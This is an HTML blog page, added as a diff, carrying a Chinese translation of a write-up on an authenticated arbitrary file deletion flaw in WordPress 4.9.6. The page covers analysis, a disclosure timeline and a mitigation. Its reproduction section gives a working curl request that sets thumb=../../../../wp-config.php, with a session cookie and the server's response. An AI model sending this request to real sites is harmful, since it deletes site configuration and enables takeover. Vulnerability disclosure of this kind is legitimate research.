@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="翻译https://github.com/SecWiki/CMS-Hunter WARNING: WordPress File Delete to Code Execution背景介绍Wordpress是世界上最受欢迎的一个CMS，根据资料显示，约有30%的网站在使用它。正是树大招风，它也成为黑客攻击研究的一个有趣目标。在这篇博客中将分析Wordpress核心代码中，一个经过认证的任意文件删除漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Wordpress 任意文件删除">
+<meta property="og:url" content="http://yoursite.com/2018/06/28/Wordpress <= 4.9.6 任意文件删除漏洞/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="翻译https://github.com/SecWiki/CMS-Hunter WARNING: WordPress File Delete to Code Execution背景介绍Wordpress是世界上最受欢迎的一个CMS，根据资料显示，约有30%的网站在使用它。正是树大招风，它也成为黑客攻击研究的一个有趣目标。在这篇博客中将分析Wordpress核心代码中，一个经过认证的任意文件删除漏洞">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-27/91545652.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-27/81545083.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-28/38508483.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-28/94878995.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-28/17223918.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-28/19265580.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-28/2843462.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-28/75307871.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-28/80117267.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-27/19731694.jpg">
+<meta property="og:updated_time" content="2018-06-30T03:48:02.665Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Wordpress 任意文件删除">
+<meta name="twitter:description" content="翻译https://github.com/SecWiki/CMS-Hunter WARNING: WordPress File Delete to Code Execution背景介绍Wordpress是世界上最受欢迎的一个CMS，根据资料显示，约有30%的网站在使用它。正是树大招风，它也成为黑客攻击研究的一个有趣目标。在这篇博客中将分析Wordpress核心代码中，一个经过认证的任意文件删除漏洞">
+<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//18-6-27/91545652.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/06/28/Wordpress <= 4.9.6 任意文件删除漏洞/"/>
+
+
+
+
+
+  <title>Wordpress 任意文件删除 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/28/Wordpress <= 4.9.6 任意文件删除漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Wordpress 任意文件删除</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-28T13:20:20+08:00">
+                2018-06-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全研究/" itemprop="url" rel="index">
+                    <span itemprop="name">安全研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h2><h2 id="https-github-com-SecWiki-CMS-Hunter-WARNING-WordPress-File-Delete-to-Code-Execution"><a href="#https-github-com-SecWiki-CMS-Hunter-WARNING-WordPress-File-Delete-to-Code-Execution" class="headerlink" title="https://github.com/SecWiki/CMS-Hunter WARNING: WordPress File Delete to Code Execution"></a><a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter WARNING: WordPress File Delete to Code Execution</a></h2><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p><code>Wordpress</code>是世界上最受欢迎的一个CMS，根据资料显示，约有30%的网站在使用它。正是树大招风，它也成为黑客攻击研究的一个有趣目标。在这篇博客中将分析Wordpress核心代码中，一个经过认证的任意文件删除漏洞，该漏洞可能会导致攻击者执行任意代码。7个月之前已经向Wordpress安全团队报告了这个漏洞，到如今仍然没有修复。自从提交之后，没有进行任何的补丁和其他措施，漫长地等待，我们还是决定把这个漏洞公开。</p>
+<h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><p>在分析这个漏洞的时候，暂时没有补丁来防御该漏洞。所以通杀全版本，包括当前的4.9.6版本，都容易受到该漏洞的影响。</p>
+<p>为了能成功利用这个漏洞，需要有一个小条件。攻击者需要先有一个编辑和删除媒体文件的权限，可能得是其中的一个用户。该漏洞可以通过一个低权限或作者用户来升级到高权限的特权，或者通过其他的漏洞/错误配置。</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>利用此漏洞可以使攻击者删除Wordpress安装中任何文件(PHP进程用户在服务器上有权限删除的任何文件)。除了删除整个Wordpress安装文件外，如果没有备份可能会导致严重后果。攻击者可以利用任意文件删除功能绕过一些安全措施并在Web服务器上执行任意代码。更确切的说，可以删除以下文件：</p>
+<ul>
+<li><strong>.htaccess</strong>  通常，删除此文件不会有任何安全后果。但是，在某些情况下，.htaccess文件包含一些安全相关的约束配置（例如，对某些文件夹的访问限制）。删除此文件将会禁用这些安全限制。</li>
+<li><strong>index.php</strong>  通常情况下，将空的index.php文件放置到目录中，以防止Web服务器无法执行的情况下，造成目录列表敏感信息泄漏。删除这些文件将为攻击者提供一份列表，列出受此措施保护的目录中的所有文件。</li>
+<li><strong>wp-config.php</strong>  删除这个WordPress安装文件，会导致在下次访问该网站时，会触发WordPress重新安装过程。这是因为wp-config.php包含数据库凭证，如果没有它，WordPress默认是未安装。攻击者可以删除该文件，使用管理员帐户的凭据进行安装，最后在服务器上执行任意代码。</li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>用户输入的内容没有经过处理，传递给文件删除函数时，造成了任意文件删除漏洞。可谓“一切输入点都是不可信的”。在PHP中，当调用unlink()函数，并且用户输入可能影响部分或这个filename参数时，会发生这种情况。没有进行适当的过滤，会删除该路径的文件。</p>
+<p>漏洞代码触发点在<code>wp-includes/post.php</code>文件。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-6-27/91545652.jpg" alt=""></p>
+<p> 在上面显示的<code>wp_delete_attachement()</code>函数中，<code>$ meta [&#39;thumb&#39;]</code>的内容在未经任何过滤的情况下用于unlink()调用。这段代码的目的是在删除图像的同时删除图像的缩略图。在Wordpress中通过媒体管理器上传的图像被表示为附属类型的帖子。值$ meta [‘thumb’]从数据库中检索，并保存为表示图像的文章的自定义字段。因此，在从数据库中检索到危险函数调用unlink()之间，表示缩略图文件名的值不会进行任何清理或检查。</p>
+<p>如果该值在保存到数据库之前也没有经过任何或其他的安全措施，将在下一段代码中看到这种情况，会造成任意文件删除漏洞。</p>
+<p><code>/wp-admin/post.php</code>文件：</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-6-27/81545083.jpg" alt=""></p>
+<p>在<code>/wp-admin/post.php</code>代码中，表示属于附件的缩略图的文件名如何保存到数据库。</p>
+<p>在从<code>$ _POST [&#39;thumb&#39;]</code>参数中的用户输入检索并通过<code>wp_update_attachment_metadata()</code>函数保存到数据库之间，没有适当的安全措施来确保该值真正代表正在编辑的附件的缩略图。</p>
+<p><code>$ _POST [&#39;thumb&#39;]</code>的值可以将任何文件的路径保存到<code>WordPress</code>上传目录相对路径中，当附件被删除时，该文件将被删除，如第一列表中所示。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登陆后台，在上传图片处。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-6-28/38508483.jpg" alt=""></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-6-28/94878995.jpg" alt=""></p>
+<p>然后 edit。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-6-28/17223918.jpg" alt=""></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-6-28/19265580.jpg" alt=""></p>
+<p>setThumbToConfig(‘5’,’15674852ce’)</p>
+<p>15674852ce</p>
+<p>wordpress_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7C225d0e7e8cd972694c91ac26fed2c53ec66c1c68b1d9ccf569bae2b339c94ce0; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7Cbc7998bd236a149fec254d82bb97e066750b5af74a1f2336e1689b572a9ec6ac; wp-settings-time-1=1530394704</p>
+<p>MacBook-Pro:pen_doc lebor$ curl -v ‘<a href="http://192.168.2.153/wordpress496/wp-admin/post.php?post=5&#39;" target="_blank" rel="noopener">http://192.168.2.153/wordpress496/wp-admin/post.php?post=5&#39;</a> -H ‘Cookie:wordpress_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7C225d0e7e8cd972694c91ac26fed2c53ec66c1c68b1d9ccf569bae2b339c94ce0; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7Cbc7998bd236a149fec254d82bb97e066750b5af74a1f2336e1689b572a9ec6ac; wp-settings-time-1=1530394704’ -d ‘action=editattachment&amp;_wpnonce=15674852ce&amp;thumb=../../../../wp-config.php’  </p>
+<ul>
+<li>Trying 192.168.2.153…  </li>
+<li>TCP_NODELAY set  </li>
+<li>Connected to 192.168.2.153 (192.168.2.153) port 80 (#0)  <blockquote>
+<p>POST /wordpress496/wp-admin/post.php?post=5 HTTP/1.1<br>Host: 192.168.2.153<br>User-Agent: curl/7.54.0<br>Accept: <em>/</em><br>Cookie:wordpress_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7C225d0e7e8cd972694c91ac26fed2c53ec66c1c68b1d9ccf569bae2b339c94ce0; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7Cbc7998bd236a149fec254d82bb97e066750b5af74a1f2336e1689b572a9ec6ac; wp-settings-time-1=1530394704<br>Content-Length: 73<br>Content-Type: application/x-www-form-urlencoded  </p>
+<ul>
+<li>upload completely sent off: 73 out of 73 bytes<br>&lt; HTTP/1.1 302 Found<br>&lt; Date: Sat, 30 Jun 2018 21:45:23 GMT<br>&lt; Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45<br>&lt; X-Powered-By: PHP/5.4.45<br>&lt; Expires: Wed, 11 Jan 1984 05:00:00 GMT<br>&lt; Cache-Control: no-cache, must-revalidate, max-age=0<br>&lt; X-Frame-Options: SAMEORIGIN<br>&lt; Referrer-Policy: strict-origin-when-cross-origin<br>&lt; Location: <a href="http://192.168.2.153/wordpress496/wp-admin/post.php?post=5&amp;action=edit&amp;message=4" target="_blank" rel="noopener">http://192.168.2.153/wordpress496/wp-admin/post.php?post=5&amp;action=edit&amp;message=4</a><br>&lt; Content-Length: 0<br>&lt; Content-Type: text/html<br>​</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-6-28/2843462.jpg" alt=""></p>
+<p>现在点击Delete Permanently即可。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-6-28/75307871.jpg" alt=""></p>
+<p>跳转到安装界面了。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-6-28/80117267.jpg" alt=""></p>
+<h2 id="暂缓措施"><a href="#暂缓措施" class="headerlink" title="暂缓措施"></a>暂缓措施</h2><p>在写此文章的时候，该漏洞还未被修复。以下的代码只是一个临时的修补措施。通过将修补程序添加到当前活动的主题/子主题的functions.php文件中，就是将修补程序集成到现有的WordPress安装代码中，来防御该漏洞。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-6-27/19731694.jpg" alt=""></p>
+<p>提供的所有修补程序都会链接到<code>wp_update_attachement_metadata()</code>调用中，并确保为元值提供的数据不包含任何涉及到路径遍历的内容，因而不会删除与安全相关的文件。</p>
+<p>以上提供的修复方案只是临时的，不能保证兼容Wordpress以后的版本和插件。建议你还是时刻关注Wordpress的修补措施。</p>
+<h2 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h2><ul>
+<li>2017/11/20   在Hackerone 上向Wordpress安全团队提交漏洞报告</li>
+<li>2017/11/22 这个漏洞被安全团队确认和分类</li>
+<li>2017/12/12 询问进展情况</li>
+<li>2017/12/18  Wordpress正在开发一个补丁程序。要求发布日期。没有回复。</li>
+<li>2018/01/09 要求发布日期。又是没反应。</li>
+<li>2018/01/20 由于问题太严重了，要求Hackerone进行调解。</li>
+<li>2018/01/24 WordPress安全团队估计需要6个月的时间才能修复。</li>
+<li>2018/05/24 询问有关问题的进展/计划，并提醒我们尽快发布。但没有反应。</li>
+<li>2018/06/26 提交了漏洞7个月，仍未修复漏洞。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在这篇博客文章中，我们介绍了WordPress核心代码中中的一个任意文件删除漏洞，它允许任何具有作者权限的用户完全接管WordPress网站并在服务器上执行任意代码。该漏洞去年报告给WordPress安全团队，但在编写本文时仍然没有作任何修补。</p>
+<p>为了让大家认识到此漏洞的严重性，我们还是决定发布一些细节和修补程序。使用我们的安全分析报告可以轻松发现并复现该漏洞，我们相信这个问题已经被许多安全研究人员了解。尽管用户帐户的限制条件，可以减少一些网站被受到攻击，但共享多个用户帐户的站点应该应用修补程序。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1.<a href="https://w3techs.com/technologies/details/cm-wordpress/all/all" target="_blank" rel="noopener">https://w3techs.com/technologies/details/cm-wordpress/all/all</a></p>
+<p>2.<a href="https://codex.wordpress.org/Custom_Fields" target="_blank" rel="noopener">https://codex.wordpress.org/Custom_Fields</a></p>
+<p>3.<a href="http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/" target="_blank" rel="noopener"> Wordpress &lt;= 4.9.6 任意文件删除漏洞</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/27/recursion_digui/" rel="next" title="递归">
+                <i class="fa fa-chevron-left"></i> 递归
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#翻译"><span class="nav-number">1.</span> <span class="nav-text">翻译</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#https-github-com-SecWiki-CMS-Hunter-WARNING-WordPress-File-Delete-to-Code-Execution"><span class="nav-number">2.</span> <span class="nav-text">https://github.com/SecWiki/CMS-Hunter WARNING: WordPress File Delete to Code Execution</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#背景介绍"><span class="nav-number">3.</span> <span class="nav-text">背景介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#受影响的版本"><span class="nav-number">4.</span> <span class="nav-text">受影响的版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式"><span class="nav-number">5.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">6.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">7.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#暂缓措施"><span class="nav-number">8.</span> <span class="nav-text">暂缓措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间线"><span class="nav-number">9.</span> <span class="nav-text">时间线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">10.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">11.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
